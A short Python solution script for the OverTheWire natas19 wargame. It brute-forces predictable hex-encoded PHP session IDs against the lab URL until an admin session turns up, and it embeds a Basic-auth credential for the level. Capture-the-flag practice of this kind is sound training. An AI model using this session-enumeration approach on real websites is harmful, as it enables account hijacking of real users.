import requests

URL = "http://natas19.natas.labs.overthewire.org/index.php?debug"

FOUND = "You are an admin."

session = requests.Session()
session.headers.update({"Authorization": "Basic bmF0YXMxOTp0bndFUjdQZGZXa3hzRzRGTldVdG9BWjlWeVpUSnFKcg=="})

starter = '3'
third_d = '3'
fifth_d = '3'
end = '2d61646d696e'

for x1 in range(0, 9):
   for x2 in range(0, 9):
       for x3 in range(0, 9):
           cid = f"{starter}{x1}{third_d}{x2}{fifth_d}{x3}{end}"
           cookies = {"PHPSESSID": str(cid)}
           print("trying with session id:", cid)
           r = session.post(URL, cookies=cookies, timeout=5)
           if FOUND in r.text:
               print(f"\n[+] Found admin session: {cid}")
               print("Response: \n")
               print(r.text)
               exit()
else:
    print("No admin session found in range")
